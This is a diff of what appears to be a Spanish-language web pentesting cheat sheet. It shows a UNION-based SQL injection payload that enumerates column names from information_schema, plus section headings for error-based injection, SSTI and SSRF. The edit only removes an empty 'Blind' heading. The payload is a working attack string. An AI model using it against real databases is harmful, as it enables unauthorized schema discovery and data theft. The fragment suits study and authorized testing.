@@ -39,7 +39,6 @@ Lista información de las tablas
 Lista información de las columnas
 > ' union select column_name from information_schema.columns where table_schema=”<DB_NAME>” and table_name = '<TABLE_NAME>'-- -
 ### Error Based
-### Blind
 
 ## Server Site Template Injection (SSTI)
 ## Server Site Request Forgery (SSRF)
